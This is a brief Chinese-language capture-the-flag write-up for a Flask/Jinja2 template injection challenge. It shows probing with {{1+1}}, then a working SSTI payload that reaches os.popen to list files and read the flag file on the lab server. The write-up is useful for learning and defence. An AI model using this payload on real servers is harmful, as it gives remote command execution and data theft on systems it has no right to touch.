## Web_python_template_injection

基础模板注入

试一下

```
/{{1+1}}
```

返回了

```
URL http://111.198.29.45:40527/2 not found
```

发现可以用chrome hackbar扩展自带的ssti模板直接注入

```
/{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

返回

```
URL http://111.198.29.45:40527/fl4g index.py not found
```

读一下/fl4g就可

```
{{ config.__class__.__init__.__globals__['os'].popen('cat%20fl4g').read() }}
```

### 参考资料

Flask/Jinja2 SSTI && python 沙箱逃逸：https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/](https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-沙箱逃逸/)